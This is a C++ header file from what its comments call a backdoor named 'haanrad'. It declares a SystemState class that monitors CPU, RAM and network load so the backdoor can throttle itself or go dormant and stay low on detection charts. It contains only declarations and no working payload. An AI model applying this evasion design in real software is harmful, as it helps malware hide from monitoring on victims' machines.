//
// Created by bensoer on 31/10/16.
//

#ifndef HAANRAD_SYSTEMSTATE_H
#define HAANRAD_SYSTEMSTATE_H

#include <zconf.h>
#include "Time.h"

//SystemState is a wrapper handler that will get system information about the computers current workings. This
//will answer how much RAM is being used, CPU usage, process counts, how much work our process is taking

//This class should ultimately dictate whether the backdoor should completely go dormant because of lack of system
//activity or whether it can gun it out because there is alot happening on it

//This class should be able to send events that will cause haanrad to slow down to complete stop

//System State should be a singleton across a multi-threaded architecture ?

//SystemState should be hooked into either a timer or system notifications so that it can examine and react appropriatly

//IMPORTANT STATS
//How much CPU is our process taking ?
//How much CPU are other processes taking ?
//How much RAM is being used currently ?
//How busy is the network ?
class SystemState {

public:


    enum SystemStateMode { HIGH, MEDIUM, LOW, DORMENT, UNKNOWN, STARTUP};

    static SystemStateMode currentState;

    static SystemState * getInstance(Time * time);

    //these two can tell us how much ram we are using and how that compares to the average, if we are high or not.
    //we want to stay always below average, so that we stay low on detection charts
    double getPercentageOfRAMUsed();
    double getAverageProcessRAMUsage();

    double getPercentageOfCPUUsed(bool setHistoryOnly = false);
    double getAverageProcessCPUUsage(bool setHistoryOnly = false);

    unsigned long long getInboundBitRate(bool setHistoryOnly = false);
    unsigned long long getOutboundBitRate(bool setHistoryOnly = false);
    void resetNetworkCheckTime();


private:

    SystemState(Time * time);
    static SystemState * instance;

    Time * time;

    //these can tell us how much CPU we are using and how that compares to the average
    unsigned long long previousTotalCPUTime = 0;
    long long previousHaanradCPUTime = 0;

    //tell how busy the network is
    unsigned long long previousByteCount = 0;
    long int previousCheckTime = 0;

    unsigned long long previousInboundBits = 0;
    unsigned long long previousOutboundBits = 0;

    long int getSystemTime();

};


#endif //HAANRAD_SYSTEMSTATE_H
